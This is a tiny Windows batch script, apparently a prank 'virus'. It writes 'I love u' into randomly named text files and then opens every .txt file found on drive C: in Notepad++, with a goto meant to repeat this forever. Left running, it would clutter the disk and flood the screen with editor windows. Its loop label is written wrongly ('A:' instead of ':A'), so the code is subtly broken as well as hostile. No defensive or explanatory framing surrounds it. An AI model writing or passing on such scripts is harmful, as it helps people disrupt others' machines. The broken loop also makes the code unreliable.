@ECHO off
A:
echo I love u > %RANDOM%.txt
set command=C:\Program Files (x86)\Notepad++\notepad++.exe
FOR /R C: %%a IN (*.txt) DO %command% %%a
goto :A
